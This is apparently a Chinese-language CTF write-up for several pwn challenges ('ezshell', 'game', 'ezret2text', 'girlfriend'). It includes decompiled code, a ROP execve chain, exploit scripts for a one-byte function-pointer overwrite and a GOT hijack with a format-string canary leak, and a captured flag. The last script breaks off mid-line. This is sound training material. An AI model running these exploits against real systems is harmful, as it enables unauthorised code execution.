char s[256]; // [rsp+110h] [rbp-748h] BYREF  _OWORD dest[16]; // [rsp+210h] [rbp-648h] BYREF  char s_1[16]; // [rsp+310h] [rbp-548h] BYREF  char v47; // [rsp+320h] [rbp-538h] BYREF  _OWORD buf[64]; // [rsp+410h] [rbp-448h] BYREF  unsigned __int64 v49; // [rsp+818h] [rbp-40h]  v49 = __readfsqword(0x28u);  setvbuf(stdout, 0LL, 1, 0LL);  s2_1 = s2;  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  signal(13, (__sighandler_t)((char *)&amp;dword_0 + 1));  ptrace(PTRACE_TRACEME, 0LL, 0LL, 0LL);  time(0LL);  puts(&quot;========================================\n        This is a ez console!\n========================================&quot;);  puts(    &quot;I believe you can get the flag easily.\n&quot;    &quot;By the way, What you see is not what you get.\n&quot;    &quot;When all else fails, type help.\n&quot;    &quot;========================================&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      memset(s, 0, sizeof(s));      putchar(36);      if ( fgets(s, 256, stdin) )        break;      __printf_chk(1LL, &quot;error&quot;);    &#125;    memset(buf, 0, sizeof(buf));    v4 = strchr(s, 10);    if ( v4 )      *v4 = 0;    if ( *(_DWORD *)s == 1886152040 &amp;&amp; !s[4] )    &#123;      buf[2] = _mm_load_si128((const __m128i *)&amp;xmmword_21A0);      qmemcpy(buf, &quot;Supported commands: pwd, whoami,&quot;, 32);      LOWORD(buf[4]) = 10;      buf[3] = _mm_load_si128((const __m128i *)&amp;xmmword_21B0);      goto LABEL_12;    &#125;    n41 = 41;    for ( i = 0LL; ; n41 = X_showKey[i] )    &#123;      s2_1[i++] = n41 ^ 0x5A;      if ( i == 7 )        break;    &#125;    s2[7] = 0;    if ( !strcmp(s, s2_1) )    &#123;      v23 = time(0LL);      v24 = getpid();      srand(v23 ^ v24);      rand();      v25 = rand();      v26 = v25;      if ( (v25 &amp; 1) == 0 )      &#123;        v35 = v25;        rand();        v26 = v35;      &#125;      __snprintf_chk(s_1, 256LL, 1LL, 256LL, &quot;Key: %u\n&quot;, v26);      __strcpy_chk(buf, s_1, 1024LL);    &#125;    else    &#123;      if ( strchr(s, 38)        || strstr(s, &quot;||&quot;)        || strchr(s, 59)        || strchr(s, 62)        || strchr(s, 60)        || strchr(s, 124)        || strchr(s, 36)        || strchr(s, 96) )      &#123;        LOBYTE(buf[1]) = 0;        buf[0] = _mm_load_si128((const __m128i *)&amp;xmmword_21C0);        goto LABEL_12;      &#125;      memset(dest, 0, sizeof(dest));      v7 = strchr(s, 32);      if ( v7 )      &#123;        n255 = v7 - s;        if ( (unsigned __int64)(v7 - s) &gt; 0xFF )          n255 = 255LL;        __strncpy_chk(dest, s, n255, 256LL);        *((_BYTE *)dest + n255) = 0;      &#125;      else      &#123;        strncpy((char *)dest, s, 0xFFuLL);      &#125;      n_1 = strlen((const char *)dest);      if ( n_1 )      &#123;        n45 = 45;        n6 = 0LL;        n6584176 = 6584176;        while ( 1 )        &#123;          s1[n6++] = n45 ^ 0x5A;          if ( n6 == 6 )            break;          n45 = X_whoami[n6];        &#125;        n47 = 47;        s1[6] = 0;        strcpy(ls, &quot;ls&quot;);        for ( j = 0LL; ; n47 = X_uname[j] )        &#123;          s1_1[j++] = n47 ^ 0x5A;          if ( j == 5 )            break;        &#125;        s1_1[5] = 0;        n41_1 = 41;        for ( k = 0LL; ; n41_1 = X_showKey[k] )        &#123;          v43[k++] = n41_1 ^ 0x5A;          if ( k == 7 )            break;        &#125;        v43[7] = 0;        n53 = 53;        for ( m = 0LL; ; n53 = X_opendoor[m] )        &#123;          s_1[m++] = n53 ^ 0x5A;          if ( m == 11 )            break;        &#125;        s2_2 = s2_1;        s2_3 = (const char *)&amp;n6584176;        v37[0] = s1;        v19 = (const char **)v37;        s_1[11] = 0;        v37[1] = ls;        v37[4] = s_1;        v37[2] = s1_1;        v37[5] = 0LL;        v37[3] = v43;        while ( strncmp((const char *)dest, s2_3, n_1) )        &#123;          s2_3 = *v19++;          if ( !s2_3 )          &#123;            s2_1 = s2_2;            LOBYTE(buf[1]) = 0;            buf[0] = _mm_load_si128((const __m128i *)&amp;xmmword_21F0);            goto LABEL_12;          &#125;        &#125;        s2_1 = s2_2;        for ( n = 0LL; n != 11; ++n )          s1[n] = X_opendoor[n] ^ 0x5A;        s1[11] = 0;        v21 = strncmp(s1, (const char *)dest, n_1);        if ( v21 )        &#123;          stream = popen(s, &quot;re&quot;);          if ( !stream )          &#123;            perror(&quot;popen failed&quot;);            exit(1);          &#125;          while ( fgets(s_1, 256, stream) )            __strcat_chk(buf, s_1, 1024LL);          pclose(stream);        &#125;        else        &#123;          s_2 = strstr(s, &quot;-k&quot;);          if ( s_2 &amp;&amp; strlen(s_2) &gt; 2 )          &#123;            seed = time(0LL);            srand(seed);            v29 = rand();            __snprintf_chk(s1_1, 32LL, 1LL, 32LL, &quot;%d&quot;, v29);            n60 = 60LL;            v31 = (int *)&amp;v47;            *(_OWORD *)s_1 = 0LL;            while ( n60 )            &#123;              *v31++ = v21;              --n60;            &#125;            n0xF = strlen(s);            if ( n0xF &gt; 0xF )            &#123;              n255_1 = (int)n0xF - 15;              __strncpy_chk(s_1, &amp;s[15], n255_1, 256LL);              s_1[n255_1] = 0;            &#125;            if ( !strcmp(s1_1, s_1) )            &#123;              for ( ii = 0LL; ii != 10; ++ii )                v43[ii] = X_catflagN[ii] ^ 0x21;              v43[10] = 0;              *(_QWORD *)s = 0LL;              snprintf(s, 8uLL, &quot;%s&quot;, v43);            &#125;            else            &#123;              LODWORD(buf[1]) = 663916;              buf[0] = _mm_load_si128((const __m128i *)&amp;xmmword_21E0);            &#125;          &#125;          else          &#123;            strcpy((char *)buf, &quot;please use openthedoor -k &lt;key&gt;. \n&quot;);          &#125;        &#125;      &#125;      else      &#123;        *(_QWORD *)&amp;buf[1] = 0xA202E646E616DLL;        buf[0] = _mm_load_si128((const __m128i *)&amp;xmmword_21D0);      &#125;    &#125;LABEL_12:    __printf_chk(1LL, &quot;%s&quot;, (const char *)buf);  &#125;&#125;
这题的难点主要是逆向，大概意思是做了一个shell，但是只能通过符合名称的命令，但是
v7 = strchr(s, 32);if ( v7 )&#123;n255 = v7 - s;if ( (unsigned __int64)(v7 - s) &gt; 0xFF )  n255 = 255LL;__strncpy_chk(dest, s, n255, 256LL);*((_BYTE *)dest + n255) = 0;&#125;else&#123;strncpy((char *)dest, s, 0xFFuLL);&#125;
允许前缀绕过，也就是说openthedoor可以被o替代
关键是，允许的命令中有showKey，利用前缀绕过就可以将sh发送给shell
得到shell以后，发现cat flag没反应，但是其他命令的报错有显示，对比命令是第几项，可以看出来是成功运行了的
 ~/Whuctf/ezshell  ./pwn                                                                                                 ========================================        This is a ez console!========================================I believe you can get the flag easily.By the way, What you see is not what you get.When all else fails, type help.========================================$shcat /flag123sh: 2: 123: not found
将标准输出重定向为标准错误，就可以得到内容了（似乎sh /flag也可以)
 ~/Whuctf/ezshell  ./pwn                                                                                                 ========================================        This is a ez console!========================================I believe you can get the flag easily.By the way, What you see is not what you get.When all else fails, type help.========================================$shcat /flag123sh: 2: 123: not foundcat /flag &gt;&amp;2your_flag_contentcat /flag 1&gt;&amp;2 &amp;your_flag_conten
 ~/Whuctf/ezshell  ./pwn                                                                                          ========================================        This is a ez console!========================================I believe you can get the flag easily.By the way, What you see is not what you get.When all else fails, type help.========================================$sh /flag/flag: 1: your_flag_content: not found[2]  + 8854 death of child  ./pwn
game
文件函数非常多，IDAFeeds恢复后找到函数入口，发现是IO_puts，后面紧随着libc_read，存在非常大的栈溢出空间
ROPgadget生成ROP链
ROPgadget --binary pwn --ropchain
得到的是这样的
- Step 5 -- Build the ROP chain#!/usr/bin/env python3# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = b&#x27;&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000040faaf) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4120) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000426a1a) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000041f555) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040faaf) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4128) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000514129) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000041f555) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040c6bc) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4120) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x000000000040faaf) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4128) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x000000000053885b) # pop rdx ; pop rbx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4128) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x4141414141414141) # paddingp += pack(&#x27;&lt;Q&#x27;, 0x0000000000514129) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000052a450) # add rax, 1 ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000004ac819) # syscall
发现没有让链对齐，add的过程出现问题，于是多加了一个八字节并且将add rax , 1改成了pop rax
io=start()io.recvuntil(b&quot;Input your name:&quot;)p = b&#x27;a&#x27;*40p += pack(&#x27;&lt;Q&#x27;, 0x000000000040faaf) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4120) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x0000000000426a1a) # pop rax ; retp += b&#x27;/bin//sh&#x27;p += pack(&#x27;&lt;Q&#x27;, 0x000000000041f555) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040faaf) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4128) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x0000000000514129) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000041f555) # mov qword ptr [rsi], rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x000000000040c6bc) # pop rdi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4120) # @ .datap += pack(&#x27;&lt;Q&#x27;, 0x000000000040faaf) # pop rsi ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4128) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x000000000053885b) # pop rdx ; pop rbx ; retp += pack(&#x27;&lt;Q&#x27;, 0x00000000005e4128) # @ .data + 8p += pack(&#x27;&lt;Q&#x27;, 0x4141414141414141) # paddingp += pack(&#x27;&lt;Q&#x27;, 0x0000000000514129) # xor rax, rax ; retp += pack(&#x27;&lt;Q&#x27;, 0x0000000000426a1a) # pop raxp += pack(&#x27;&lt;Q&#x27;, 0x000000000000003b) # execvep += pack(&#x27;&lt;Q&#x27;, 0x00000000004ac819) # syscallio.send(p)io.interactive()
ezret2text
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  unsigned __int64 n3_4; // rax  unsigned __int64 n3_3; // rax  unsigned __int64 n3_2; // rax  const char *v7; // rcx  unsigned __int64 n3; // rax  void *ptrd_1; // rax  int ptrc_1; // r9d  void (__fastcall **ptr)(_QWORD); // [rsp+0h] [rbp-48h]  _BYTE *ptra; // [rsp+0h] [rbp-48h]  const void **ptrb; // [rsp+0h] [rbp-48h]  int ptrc; // [rsp+0h] [rbp-48h]  void *ptrd; // [rsp+0h] [rbp-48h]  __int64 n3_5; // [rsp+8h] [rbp-40h]  __int64 ulong; // [rsp+8h] [rbp-40h]  __int64 n3_1; // [rsp+8h] [rbp-40h]  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  alarm(0x78u);  while ( 1 )  &#123;    puts(&quot;\n=== Tiny Arena ===&quot;);    puts(&quot;1) create&quot;);    puts(&quot;2) show&quot;);    puts(&quot;3) poke (single-byte write)&quot;);    puts(&quot;4) release&quot;);    puts(&quot;5) exit&quot;);    switch ( read_long(&quot;&gt; &quot;) )    &#123;      case 1LL:        n3 = read_long(&quot;slot idx (0-3): &quot;);        if ( n3 &gt; 3 )          goto LABEL_20;        if ( slots[(int)n3] )        &#123;          puts(&quot;[-] occupied&quot;);        &#125;        else        &#123;          n3_1 = (int)n3;          ptrc = n3;          ptrd_1 = calloc(1uLL, 0x28uLL);          ptrc_1 = ptrc;          if ( !ptrd_1 )            exit(1);          ptrd = ptrd_1;          *((_QWORD *)ptrd_1 + 3) = peaceful_release;          *((_DWORD *)ptrd_1 + 8) = 100;          __snprintf_chk(ptrd_1, 24LL, 1LL, 24LL, &quot;hero_%d&quot;, ptrc_1);          slots[n3_1] = ptrd;          __printf_chk(1LL, &quot;[+] created @ %p\n&quot;, ptrd);        &#125;        continue;      case 2LL:        n3_2 = read_long(&quot;slot idx (0-3): &quot;);        if ( n3_2 &gt; 3 )          goto LABEL_20;        v7 = (const char *)slots[(int)n3_2];        if ( !v7 )          goto LABEL_17;        ptrb = (const void **)slots[(int)n3_2];        __printf_chk(1LL, &quot;name: %.*s\n&quot;, 24, v7);        __printf_chk(1LL, &quot;hp: %d\n&quot;, *((_DWORD *)ptrb + 8));        __printf_chk(1LL, &quot;on_release: %p\n&quot;, ptrb[3]);        break;      case 3LL:        n3_3 = read_long(&quot;slot idx (0-3): &quot;);        if ( n3_3 &gt; 3 )          goto LABEL_20;        ptra = (_BYTE *)slots[(int)n3_3];        if ( !ptra )          goto LABEL_17;        ulong = read_ulong(&quot;index: &quot;);        ptra[ulong] = read_ulong(&quot;byte value (0-255 or 0x..): &quot;);        puts(&quot;[+] wrote one byte.&quot;);        break;      case 4LL:        n3_4 = read_long(&quot;slot idx (0-3): &quot;);        if ( n3_4 &gt; 3 )        &#123;LABEL_20:          puts(&quot;[-] bad idx&quot;);        &#125;        else        &#123;          n3_5 = (int)n3_4;          ptr = (void (__fastcall **)(_QWORD))slots[(int)n3_4];          if ( ptr )          &#123;            __printf_chk(1LL, &quot;[*] Releasing slot %d ...\n&quot;, n3_4);            ptr[3](ptr);            free(ptr);            slots[n3_5] = 0LL;            puts(&quot;[*] Freed.&quot;);          &#125;          else          &#123;LABEL_17:            puts(&quot;[-] empty&quot;);          &#125;        &#125;        break;      case 5LL:        puts(&quot;bye&quot;);        return 0;      default:        puts(&quot;???&quot;);        continue;    &#125;  &#125;&#125;
看起来非常吓唬人
调试看看
pwndbg&gt; p &amp;slots$2 = (&lt;data variable, no debug info&gt; *) 0x61d4e6200060 &lt;slots&gt;pwndbg&gt; tele 0x61d4e620006000:0000│     0x61d4e6200060 (slots) ◂— 001:0008│     0x61d4e6200068 (slots+8) ◂— 002:0010│     0x61d4e6200070 (slots+16) —▸ 0x61d4fb3fd2a0 ◂— 0x325f6f726568 /* &#x27;hero_2&#x27; */03:0018│     0x61d4e6200078 (slots+24) ◂— 004:0020│     0x61d4e6200080 (keep_win_addr) —▸ 0x61d4e61fd6f0 (win) ◂— endbr6405:0028│     0x61d4e6200088 ◂— 0xfff100040000001306:0030│     0x61d4e6200090 ◂— 007:0038│     0x61d4e6200098 ◂— 0pwndbg&gt; tele 0x61d4fb3fd2a000:0000│     0x61d4fb3fd2a0 ◂— 0x325f6f726568 /* &#x27;hero_2&#x27; */01:0008│     0x61d4fb3fd2a8 ◂— 002:0010│     0x61d4fb3fd2b0 ◂— 003:0018│     0x61d4fb3fd2b8 —▸ 0x61d4e61fd6e0 (peaceful_release) ◂— endbr6404:0020│     0x61d4fb3fd2c0 ◂— 0x64 /* &#x27;d&#x27; */05:0028│     0x61d4fb3fd2c8 ◂— 0x20d4106:0030│     0x61d4fb3fd2d0 ◂— 007:0038│     0x61d4fb3fd2d8 ◂— 0pwndbg&gt;
有一个全局数组存储有堆地址，并且有后门函数，这个堆里面有名字，还有一个函数地址，是释放堆是调用的
可以对堆内容进行修改，发现peaceful_release与win只有一字节的差别，并且没有现在修改的偏移，也就是说通过一字节的修改
将peaceful_release改成win，再释放对抗即可getshell
def create(idx):    p.recvuntil(b&quot;&gt;&quot;)    p.send(str(1))    p.recvuntil(b&quot;slot idx (0-3): &quot;)    p.send(str(idx))    p.recvuntil(b&quot;[+] created @ &quot;)    addr_str = p.recvline().strip()    addr = int(addr_str, 16)    log.success(hex(addr))    return addrdef show(idx):    p.recvuntil(b&quot;&gt;&quot;)    p.send(str(2))    p.recvuntil(b&quot;slot idx (0-3): &quot;)    p.send(str(idx))    p.recvuntil(b&quot;on_release: &quot;)    addr_str = p.recvline().strip()    addr = int(addr_str, 16)    log.success(hex(addr))    return addrdef edit(idx,index,content):    p.recvuntil(b&quot;&gt;&quot;)    p.send(str(3))    p.recvuntil(b&quot;slot idx (0-3): &quot;)    p.send(str(idx))    p.recvuntil(b&quot;index: &quot;)    p.send(str(index))    p.recvuntil(b&quot;byte value (0-255 or 0x..): &quot;)    p.send(str(content))def delete(idx):    p.recvuntil(b&quot;&gt;&quot;)    p.send(str(4))    p.recvuntil(b&quot;slot idx (0-3): &quot;)    p.send(str(idx))p=start()addr2=create(2)edit(2,24,0xf0)delete(2)p.interactive()#flag&#123;085f8f5d-7251-40ca-a4f7-4a3be1555193&#125;
girlfriend
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int n4; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+8h] [rbp-8h]  v4 = __readfsqword(0x28u);  sub_1349(a1, a2, a3);  while ( 1 )  &#123;    sub_179C();    __isoc99_scanf(&quot;%d&quot;, &amp;n4);    getchar();    if ( n4 &gt; 4 || n4 &lt;= 0 )      break;    switch ( n4 )    &#123;      case 4:        sub_1ADB();        puts(&quot;Looks like you&#x27;re still in the dream.&quot;);        break;      case 3:        sub_1A33();        break;      case 1:        sub_1801();        break;      default:        sub_1903();        break;    &#125;  &#125;  puts(&quot;Hey, what are you doing?&quot;);  exit(1);&#125;
 ~/Whuctf/girlfriend  checksec pwn                                                                                         [*] &#x27;/home/ubuntu/Whuctf/girlfriend/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    SHSTK:      Enabled    IBT:        Enabled
保护几乎全开，只有Partial RELRO，很有概率GOT劫持，但是不知道劫持什么
先关了地址随机化进行调试
void sub_1A33()&#123;  char *s1; // [rsp+8h] [rbp-8h]  s1 = (char *)malloc(0x10uLL);  puts(&quot;It looks like your girlfriend doesn not want to talk to you.&quot;);  puts(&quot;Maybe you should add something special. Then she will tell you her name.&quot;);  sub_1615(s1 + 8, 8LL);  if ( !strncmp(s1, &quot;iloveuiloveu&quot;, 0xCuLL) )  &#123;    puts(&quot;she loves you as well.&quot;);    printf(&quot;%p&quot;, &amp;unk_40B8);  &#125;  free(s1);&#125;
只要s1与iloveuiloveu相同就可以得到elf基地址，在这个函数可以改后4个字节
还需要改前面8个字节
void sub_1801()&#123;  _BYTE *ptr; // [rsp+8h] [rbp-8h]  ptr = malloc(0x10uLL);  puts(&quot;If you don&#x27;t want her to find out what you said, i can keep it a secret for you.&quot;);  sub_1615(ptr, 16LL);  if ( *ptr == 121 || *ptr == 89 )  &#123;    puts(&quot;Ok, i will keep it.&quot;);    free(ptr);    puts(&quot;What do you want to say?&quot;);    sub_1615(ptr, 16LL);    puts(&quot;You said: &quot;);    puts(ptr);  &#125;  else  &#123;    puts(&quot;What do you want to say?&quot;);    sub_1615(ptr, 16LL);    puts(&quot;You said: &quot;);    puts(ptr);    puts(&quot;She doesn&#x27;t care.&quot;);    free(ptr);  &#125;&#125;
（输入一个能使*ptr=y的字符，不太清楚是y或者不是y的区别）可以在堆中写入字符，这里我们就可以输入iloveuiloveu的前8个字符
先调用sub_1801输入iloveuil，在调用sub_1A33输入oveu就可以得到elf基址了
当然这里也不是要求输入iloveuiloveu，因为有一个加密函数，异或加密可以解密，按他的加密逻辑写一个解密函数就可以了
观察到
unsigned __int64 sub_1903()&#123;  __int64 v1; // [rsp+8h] [rbp-18h] BYREF  void *ptr; // [rsp+10h] [rbp-10h]  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  v1 = 0LL;  ptr = malloc(0x10uLL);  if ( byte_40B0 != 1 )  &#123;    puts(&quot;Get out of here!&quot;);  &#125;  else  &#123;    puts(&quot;Welcome to my flower shop.&quot;);    puts(&quot;You could order a flower for your girlfriend.&quot;);    puts(&quot;Do you want to order?&quot;);    sub_1615(ptr, 16LL);    if ( *(_BYTE *)ptr == 121 || *(_BYTE *)ptr == 89 )    &#123;      puts(&quot;Where does she live?&quot;);      sub_1615(&amp;v1, 8LL);      puts(&quot;What flower do you want to order for her?&quot;);      sub_1615(v1, 3LL);      puts(&quot;Welcome back!&quot;);      free(ptr);      byte_40B0 = 0;    &#125;    else    &#123;      puts(&quot;See you next time!&quot;);    &#125;  &#125;  return v3 - __readfsqword(0x28u);&#125;
可以实现任意地址写，虽然只能写3个字节
有了elf地址就有了got地址，又能实现任意写改部分地址，几乎可以肯定可以用got hijack
但是一开始没想到爆破一位地址，于是卡在了不知道改什么got
由于没有想到爆破，当然也只能改一些got表里还在elf上的函数
一开始想改的是__stack_chk_fail，改成leave retn，既可以跳过canary检查，又可以实现栈迁移
受Newstar的calc_queen的影响，rand()后rdi存着libc地址，于是我想尝试相同的做法，但是失败了
陷入了绝境，直到看见了提示——“远在天边，近在眼前”的“眼前”指的是 – 输出
输出函数中只有puts和printf
突然想起来puts(ptr)比printf(ptr)危害性差不少，可以利用格式化字符串漏洞同时泄露canary和栈上的__libc_start_main地址，进而得到libc基址
到了这一刻，就豁然开朗了
开了沙箱，orw解决；溢出字节少，栈迁移解决
dword_6100 = 0def sub_14AA(a1, a2):    global dword_6100    return (a2 * a1) ^ (dword_6100 &amp; 0xFF)def sub_14D0(a2):    char_table = []    v11 = 0    for i in range(26):        if v11 &lt; a2:            char_table.append(chr(i + 65))  # A-Z            v11 += 1    for i in range(26):        if v11 &lt; a2:            char_table.append(chr(i + 97))  # a-z            v11 += 1    for i in range(10):        if v11 &lt; a2:            char_table.append(chr(i + 48))  # 0-9            v11 += 1    if v11 &lt; a2:        char_table.append(&#x27;+&#x27;)        v11 += 1    if v11 &lt; a2:        char_table.append(&#x27;/&#x27;)        v11 += 1    if v11 &lt; a2:        char_table.append(&#x27;=&#x27;)        v11 += 1    while v11 &lt; a2:        char_table.append(chr(v11 ^ 0x5A))        v11 += 1    return char_tabledef decrypt_data(encrypted_data, length):    global dword_6100    char_table = sub_14D0(65)    decrypted_data = bytearray()    for i in range(length):        decrypted_data.append(encrypted_data[i] ^ ord(char_table[i % 65]))    dword_6100 ^= length    return bytes(decrypted_data)p=start()p.recvuntil(b&quot;--&gt;&gt;\n&quot;)p.sendline(str(1))p.recvuntil(b&quot;i can keep it a secret for you.\n&quot;)p.sendline(decrypt_data(b&quot;y&quot;,1))p.recvuntil(b&quot;What do you want to say?\n&quot;)p.sendline(b&#x27;(.,2 3.$&#x27;)p.recvuntil(b&quot;You said: \n&quot;)data1=p.recvline()log.success(decrypt_data(data1,len(data1)))p.recvuntil(b&quot;--&gt;&gt;\n&quot;)p.sendline(str(3))p.recvuntil(b&quot;Then she will tell you her name.\n&quot;)p.sendline(decrypt_data(b&quot;oveu&quot;,4))p.recvuntil(b&quot;she loves you as well.\n&quot;)addr_str = p.recv(14)text_base = int(addr_str, 16)-0x40B8log.success(hex(text_base))p.recvuntil(b&quot;--&gt;&gt;\n&quot;)p.sendline(str(2))p.recvuntil(b&quot;Do you want to order?\n&quot;)p.sendline(decrypt_data(b&quot;y&quot;,1))p.recvuntil(b&quot;Where does she live?\n&quot;)change_where=p64(text_base+0x4040)p.send(decrypt_data(change_where,len(change_where)))p.recvuntil(b&quot;What flower do you want to order for her?\n&quot;)change_what=(0xc606f0)&amp;0xffffff					#这里的最高一位c不确定，需要爆破尝试，理论1/16p.send(decrypt_data(p32(change_what),3))p.recvuntil(b&quot;--&gt;&gt;&quot;)p.sendline(str(1))p.recvuntil(b&quot;i can keep it a secret for you.&quot;)p.sendline(decrypt_data(b&quot;y&quot;,1))p.recvuntil(b&quot;What do you want to say?&quot;)payload2=b&quot;%11$p&quot;p.sendline(decrypt_data(payload2,5))p.recvuntil(b&quot;You said: &quot;)p.recvuntil(b&quot;0x&quot;)canary_hex = p.recv(16)canary = int(canary_hex, 16)print(f&quot;提取到的Canary: 